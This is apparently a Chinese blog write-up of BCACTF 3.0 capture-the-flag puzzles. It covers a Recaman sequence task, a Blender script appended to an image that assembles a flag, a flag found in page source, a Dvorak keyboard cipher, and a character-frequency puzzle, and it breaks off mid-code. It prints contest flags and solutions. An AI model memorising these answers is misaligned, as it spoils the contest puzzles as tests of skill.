    <link href="/2022/06/09/BCACTF-3-0/"/>
    <url>/2022/06/09/BCACTF-3-0/</url>
    
    <content type="html"><![CDATA[<p>BCACTF 3.0</p><span id="more"></span><p>麻了，之前的没保存全没了…</p><p>这个比赛给的提示是真的多。难度不打，很适合我 😃。</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="sequence"><a class="markdownIt-Anchor" href="#sequence"></a> Sequence</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs python">sequence = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]<br>numbers = [<span class="hljs-number">774</span>, <span class="hljs-number">5842</span>, <span class="hljs-number">4294</span>, <span class="hljs-number">9433</span>, <span class="hljs-number">5232</span>, <span class="hljs-number">1871</span>, <span class="hljs-number">3292</span>, <span class="hljs-number">4213</span>, <span class="hljs-number">2752</span>, <span class="hljs-number">5521</span>, <span class="hljs-number">4581</span>, <span class="hljs-number">3829</span>, <span class="hljs-number">2812</span>, <span class="hljs-number">2244</span>, <span class="hljs-number">3312</span>, <span class="hljs-number">7059</span>, <span class="hljs-number">2959</span>, <span class="hljs-number">8297</span>, <span class="hljs-number">7497</span>, <span class="hljs-number">1272</span>, <span class="hljs-number">2288</span>, <span class="hljs-number">160</span>, <span class="hljs-number">594</span>, <span class="hljs-number">158</span>, <span class="hljs-number">4833</span>, <span class="hljs-number">7140</span>, <span class="hljs-number">5352</span>, <span class="hljs-number">142</span>, <span class="hljs-number">3018</span>, <span class="hljs-number">9468</span>, <span class="hljs-number">5625</span>, <span class="hljs-number">4848</span>, <span class="hljs-number">2051</span>, <span class="hljs-number">3008</span>, <span class="hljs-number">4298</span>, <span class="hljs-number">6250</span>, <span class="hljs-number">144</span>]<br>validPass = <span class="hljs-string">&quot;ABCFEDFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123457890&#123;&#125;_&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gensequence</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        <span class="hljs-comment"># TODO write sequence generator for one of the most famous sequences and add it to sequence</span><br>        <span class="hljs-keyword">pass</span><br>    <br>gensequence()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> numbers:<br>    <span class="hljs-built_in">print</span>(validPass[sequence[i]%<span class="hljs-built_in">len</span>(validPass)], end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>提示是著名的数列之一。google看了一下应该是雷卡曼数列，前面几项也能对的上。完成生成数列函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gensequence</span>():<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        <span class="hljs-keyword">if</span> sequence[-<span class="hljs-number">1</span>]-<span class="hljs-built_in">len</span>(sequence) &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> sequence[-<span class="hljs-number">1</span>]-<span class="hljs-built_in">len</span>(sequence) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sequence:<br>            sequence.append(sequence[-<span class="hljs-number">1</span>]-<span class="hljs-built_in">len</span>(sequence))<br>        <span class="hljs-keyword">else</span> :<br>            sequence.append(sequence[-<span class="hljs-number">1</span>]+<span class="hljs-built_in">len</span>(sequence))<br>            <br><span class="hljs-comment"># bcactf&#123;Cr4cKInG_Th3_R3C4MaN_S3qu3NcE&#125;</span><br></code></pre></td></tr></table></figure><h2 id="blender-creation"><a class="markdownIt-Anchor" href="#blender-creation"></a> Blender Creation</h2><p>下载下来是一张图片，二进制查看可以看到末尾有一段python代码。dump出来看看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bpy<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>bpy.ops.<span class="hljs-built_in">object</span>.select_all(action=<span class="hljs-string">&quot;SELECT&quot;</span>)<br>bpy.context.scene.cursor.location = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>bpy.ops.<span class="hljs-built_in">object</span>.delete(use_global=<span class="hljs-literal">False</span>, confirm=<span class="hljs-literal">False</span>)<br>bpy.ops.<span class="hljs-built_in">object</span>.camera_add(<br>    enter_editmode=<span class="hljs-literal">False</span>,<br>    align=<span class="hljs-string">&quot;VIEW&quot;</span>,<br>    location=(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>    rotation=(<span class="hljs-number">1.1169</span>, <span class="hljs-number">0.01420</span>, <span class="hljs-number">0.8269</span>),<br>    scale=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>),<br>)<br>bpy.ops.transform.translate(<br>    value=(<span class="hljs-number">4.58569</span>, -<span class="hljs-number">4.20269</span>, <span class="hljs-number">3.1699</span>),<br>    orient_type=<span class="hljs-string">&quot;GLOBAL&quot;</span>,<br>    orient_matrix=((<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)),<br>)<br>bpy.ops.mesh.primitive_monkey_add(<br>    size=<span class="hljs-number">2</span>, enter_editmode=<span class="hljs-literal">False</span>, align=<span class="hljs-string">&quot;WORLD&quot;</span>, location=(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), scale=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>)<br>u =  <span class="hljs-string">&quot;__&quot;</span>[<span class="hljs-number">1</span>:] + <span class="hljs-string">&#x27;x_N3r0f__&#x27;</span>[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>]<br>yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">0</span>].vertices) - <span class="hljs-number">3</span>) + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">2</span>].vertices) - <span class="hljs-number">1</span>)+ <span class="hljs-string">&quot;NdR__&quot;</span> +  <span class="hljs-string">&quot;Xp_R3&quot;</span>[<span class="hljs-number">1</span>::-<span class="hljs-number">1</span>] + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <span class="hljs-string">&quot;YtH0&quot;</span>[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">5</span>].vertices) ** <span class="hljs-number">0</span> - <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;N_4ND&quot;</span> + u<br>bpy.ops.<span class="hljs-built_in">object</span>.light_add(<br>    <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;POINT&quot;</span>, radius=<span class="hljs-number">1</span>, align=<span class="hljs-string">&quot;WORLD&quot;</span>, location=(<span class="hljs-number">0</span>, -<span class="hljs-number">2.5</span>, <span class="hljs-number">0</span>), scale=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>)<br>x = (<br>    <span class="hljs-built_in">int</span>(<br>        <span class="hljs-number">0x0000000000000080</span><br>        + <span class="hljs-number">0x0000000000000240</span><br>        + <span class="hljs-number">0x0000000000000840</span><br>        - <span class="hljs-number">0x0000000000000AC0</span><br>    )<br>    - <span class="hljs-number">2</span><br>)<br>bpy.context.<span class="hljs-built_in">object</span>.data.energy = <span class="hljs-number">50</span><br>bpy.context.<span class="hljs-built_in">object</span>.data.color = (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0.69420</span>)<br><br>a = (<br>    <span class="hljs-built_in">str</span>(<br>        b64decode(<br>            (<br>                <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span>)<br>                + <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span> * <span class="hljs-number">10</span> // <span class="hljs-number">2</span> + <span class="hljs-number">6</span> - <span class="hljs-number">6</span> % <span class="hljs-number">4</span>)<br>                + (<span class="hljs-string">&quot;wemR3YhNmY&quot;</span>)<br>            )[::-<span class="hljs-number">1</span>]<br>        )<br>    )[:-<span class="hljs-number">1</span>]<br>    + yrsth<br>    + <span class="hljs-string">&quot;&#125;&quot;</span><br>)[<span class="hljs-number">2</span>:]<br>bpy.data.curves.new(<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;FONT&quot;</span>, name=<span class="hljs-string">&quot;Font Curve&quot;</span>).body = a<br>font_obj = bpy.data.objects.new(<br>    name=<span class="hljs-string">&quot;Font Object&quot;</span>, object_data=bpy.data.curves[<span class="hljs-string">&quot;Font Curve&quot;</span>]<br>)<br>bpy.context.scene.collection.objects.link(font_obj)<br>font_obj.location = (<span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">1.2</span>)<br>font_obj.rotation_euler = (<span class="hljs-number">90</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>font_obj.scale = (<span class="hljs-number">0.75</span>, <span class="hljs-number">0.75</span>, <span class="hljs-number">0.75</span>)<br></code></pre></td></tr></table></figure><p>中间的a就是我们的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = (<br>    <span class="hljs-built_in">str</span>(<br>        b64decode(<br>            (<br>                <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span>)<br>                + <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span> * <span class="hljs-number">10</span> // <span class="hljs-number">2</span> + <span class="hljs-number">6</span> - <span class="hljs-number">6</span> % <span class="hljs-number">4</span>)<br>                + (<span class="hljs-string">&quot;wemR3YhNmY&quot;</span>)<br>            )[::-<span class="hljs-number">1</span>]<br>        )<br>    )[:-<span class="hljs-number">1</span>]<br>    + yrsth<br>    + <span class="hljs-string">&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>x的值可以算，前面的base64也可以解。接出来就是bcactf{所以这里就是我们的flag。那么我们还需要得到yrsth这个部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">u =  <span class="hljs-string">&quot;__&quot;</span>[<span class="hljs-number">1</span>:] + <span class="hljs-string">&#x27;x_N3r0f__&#x27;</span>[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>]<br>yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<br>    <span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">0</span>].vertices) - <span class="hljs-number">3</span>) + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">2</span>].vertices) - <span class="hljs-number">1</span>)+ <span class="hljs-string">&quot;NdR__&quot;</span> +  <br><span class="hljs-string">&quot;Xp_R3&quot;</span>[<span class="hljs-number">1</span>::-<span class="hljs-number">1</span>] + <br><span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <br><span class="hljs-string">&quot;YtH0&quot;</span>[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>] + <br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">5</span>].vertices) ** <span class="hljs-number">0</span> - <span class="hljs-number">1</span><br>   ) + <span class="hljs-string">&quot;N_4ND&quot;</span> + u<br><br></code></pre></td></tr></table></figure><p>u的的话相当于直接给出了。中间几段明文跑一下就能得到。可以的得到以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<br>    <span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">0</span>].vertices) - <span class="hljs-number">3</span>) + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">2</span>].vertices) - <span class="hljs-number">1</span>)+ <span class="hljs-string">&quot;NdR__&quot;</span> +  <br><span class="hljs-string">&quot;pX&quot;</span> + <br><span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <br><span class="hljs-string">&quot;tH&quot;</span> + <br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">5</span>].vertices) ** <span class="hljs-number">0</span> - <span class="hljs-number">1</span><br>   ) + <span class="hljs-string">&quot;N_4ND&quot;</span> + <span class="hljs-string">&quot;_f0r3N&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到前面有一个blender这个单词。所以猜测缺少的一个是1一个是3。</p><p>后面有一个0次方，所以是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<br>    <span class="hljs-string">&quot;1&quot;</span> + <span class="hljs-string">&quot;3&quot;</span> + <span class="hljs-string">&quot;NdR__&quot;</span> +  <span class="hljs-string">&quot;pX&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <br><span class="hljs-string">&quot;tH&quot;</span> + <span class="hljs-string">&quot;0&quot;</span>   ) + <span class="hljs-string">&quot;N_4ND&quot;</span> + <span class="hljs-string">&quot;_f0r3N&quot;</span><br></code></pre></td></tr></table></figure><p>你看看那个单词像不像python？后面加了85所以应该是Y。那么yrsth就是：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">b13NdR__pXYtH0N_4ND_f0r3N</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># bcacft&#123;b13NdR__pXYtH0N_4ND_f0r3N&#125;</span><br></code></pre></td></tr></table></figure><h2 id="gogle-maze"><a class="markdownIt-Anchor" href="#gogle-maze"></a> Gogle Maze</h2><p>是一个google文档。但是我们啥都做不了，点击下一个没用。</p><p>右键查看源代码。搜索bcactf。</p><p>找到flag。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># bcactf&#123;f4</span>rthER_th<span class="hljs-number">4</span><span class="hljs-symbol">n_m3</span>eTS_th<span class="hljs-number">3</span>_EY<span class="hljs-number">3</span>_<span class="hljs-number">9928</span>ef&#125;<br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="new-keyboard"><a class="markdownIt-Anchor" href="#new-keyboard"></a> New Keyboard</h2><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">Cy ygpbo rgy ydco t.fxrape go.o yd. Ekrpat nafrgy<span class="hljs-operator">!</span> Cy p.annf m.oo.o gl mf mgojn. m.mrpfv Yd. unai co xjajyu<span class="hljs-operator">?</span><span class="hljs-keyword">t3fx0ape</span>&#123;<span class="hljs-keyword">naf0g7</span>&#123;<span class="hljs-keyword">jdabi3gl</span>&#123;&#x27;,.pyf<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><p>提示说他用了一个少见的键盘格式。</p><p>猜测</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">unai co xjajyu<span class="hljs-operator">?</span><span class="hljs-keyword">t3fx0ape</span>&#123;<span class="hljs-keyword">naf0g7</span>&#123;<span class="hljs-keyword">jdabi3gl</span>&#123;&#x27;,.pyf<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><p>是我们的flag。</p><p>找了一下应该是这个Dvorak键盘：</p><p><img src="https://s2.loli.net/2022/06/05/jpgwmIlhX7aKvSF.png" alt="KB_United_States_Dvorak.png" /></p><p>因为unai的位置刚好就是我们正常键盘的flag。所以flag为：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">xjajyu<span class="hljs-operator">?</span><span class="hljs-keyword">t3fx0ape</span>&#123;<span class="hljs-keyword">naf0g7</span>&#123;<span class="hljs-keyword">jdabi3gl</span>&#123;&#x27;,.pyf<span class="hljs-operator">+</span><br><span class="hljs-keyword">bcacft</span>&#123;k3yb0ard_lay0u7_chang3up_qwerty&#125;<br><br># <span class="hljs-keyword">bcacft</span>&#123;k3yb0ard_lay0u7_chang3up_qwerty&#125;<br></code></pre></td></tr></table></figure><h2 id="hidden-frequencies"><a class="markdownIt-Anchor" href="#hidden-frequencies"></a> Hidden Frequencies</h2><p>文件是一串字符</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiijjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkllllllllllllllllllllllllllllllllllllllllllllllllllllmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnoooooooooooooooooooooooooooooooooooooooooooooooooooppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrsssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttttttttttttttttttttttttttttttttttttttttttttttttttuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111122222222222222222222222222222222222222222222222222222333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444444444444444455555555555555555555555555555555555555555555555566666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777888888888888888888888888888888888888888888888888999999999999999999999999999999999999999999999999............................................................................................................???????????????????????????????????????????????????????????????????????????????????????????????!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#####################################################################################################$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;<br></code></pre></td></tr></table></figure><p>统计每个字符出现的次数，然后转ascii。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;msg.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    data = fp.read()<br>charset = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;.?!&lt;&gt;@#$%^&amp;&quot;</span><br><span 